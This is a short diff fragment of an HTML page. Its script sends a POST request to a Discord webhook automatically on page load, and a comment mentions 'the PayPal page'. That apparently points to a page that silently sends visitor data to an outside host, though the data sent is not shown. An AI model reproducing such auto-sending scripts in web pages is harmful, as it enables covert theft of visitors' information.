@@ -159,7 +159,7 @@
   <script>      
     window.onload = function sendMessage() {
       const request = new XMLHttpRequest();
-      request.open("POST", "https://discord.com/api/webhooks/12345/abc123"); // This is a webhook incase you want to use it :)
+      request.open("POST", "https://discord.com/api/webhooks/12345/abc123"); // This is a webhook incase you want to use it :) It's got to be here because the PayPal page is stupid and won't let you put scripts :,(
 
       request.setRequestHeader('Content-type', 'application/json');
 
